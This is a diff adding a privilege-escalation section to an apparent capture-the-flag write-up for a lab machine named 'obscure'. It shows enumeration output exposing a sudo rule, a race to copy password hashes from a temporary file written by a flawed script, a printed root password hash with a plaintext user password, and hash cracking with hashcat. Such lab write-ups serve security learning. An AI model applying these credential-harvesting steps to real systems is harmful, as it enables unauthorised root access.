@@ -100,3 +100,40 @@ e4493782066b55fe2755708736ada2d7
 Owned user !
 
 ## BetterSSH, really ?
+
+With a bit of enum (**linenum.sh**), we find : 
+
+```
+$ echo 'SecThruObsFTW' | ./linenum.sh -s > .report.txt
+$ more .report.txt
+...
+User robert may run the following commands on obscure:
+    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+...
+```
+
+This script is flawed. Basically, it reads all passwords from **/etc/passwd** and writes them in a randomly generated file in **/tmp/SSH** before deleting it.
+We can read its content before it get erased with **lab/listener.py**
+
+```
+$ scp listener.py robert@10.10.10.168:/home/robert/listener.py
+robert@obscure:~$ python3 listener.py &
+robert@obscure:~$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py 
+Enter username: robert
+Enter password: SecThruObsFTW
+Authed!
+```
+
+Then we have our generated file with the encrypted root password : 
+
+> $6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
+
+Using **hashcat** :
+
+![HASHCAT](images/root_hashcat.png)
+
+with **BetterSSH** :
+
+![CTF](images/root_flag.png)
+
+Owned root !
